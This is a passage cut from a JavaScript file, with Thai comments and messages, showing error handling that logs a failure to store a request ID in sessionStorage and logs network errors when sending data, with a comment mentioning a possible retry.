    } catch (e) {
        console.error("ไม่สามารถบันทึก requestId ลง sessionStorage:", e);
    }
  })
  .catch(error => {
    // Catch network errors หรือข้อผิดพลาดอื่นๆ ในการส่ง
    console.error(`เกิดข้อผิดพลาดในการส่งข้อมูล (requestId: ${currentRequestId}):`, error);
    // อาจจะลอง retry หรือแจ้งเตือนผู้ใช้/ระบบ
  });
}
